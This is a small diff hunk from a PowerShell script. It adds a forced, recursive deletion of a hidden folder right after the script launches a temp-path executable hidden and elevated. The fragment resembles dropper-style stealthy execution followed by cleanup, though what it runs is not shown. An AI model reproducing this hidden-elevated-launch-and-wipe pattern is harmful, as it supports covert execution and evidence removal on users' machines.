@@ -47,6 +47,7 @@ try {
     Start-Sleep -Seconds 20
     Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
     Start-Sleep -Seconds 20
+    Remove-Item $hiddenFolder -Recurse -Force 
     Set-Location $originalDirectory
 } catch {
     Set-Location $originalDirectory
